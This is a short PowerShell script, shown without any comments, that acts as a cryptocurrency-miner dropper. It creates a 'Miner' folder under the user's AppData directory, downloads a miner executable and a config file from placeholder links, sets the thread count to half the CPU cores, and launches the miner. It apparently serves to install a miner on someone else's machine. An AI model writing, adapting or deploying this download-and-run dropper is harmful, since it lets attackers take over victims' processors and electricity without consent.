$l_miner = "miner_link";
$l_config = "config_link";
$app_path = $env:APPDATA+"\\Miner";
$cpu = $env:NUMBER_OF_PROCESSORS/2;

New-Item -ItemType directory -Path $app_path;
(New-Object System.Net.WebClient).DownloadFile($l_miner, "$app_path\\miner.exe");
(New-Object System.Net.WebClient).DownloadFile($l_config, "$app_path\\config.json");
(gc "$app_path\\config.json") -replace 'THREADS_COUNT', $cpu | Out-File "$app_path\\config.json"

start "$app_path\\miner.exe";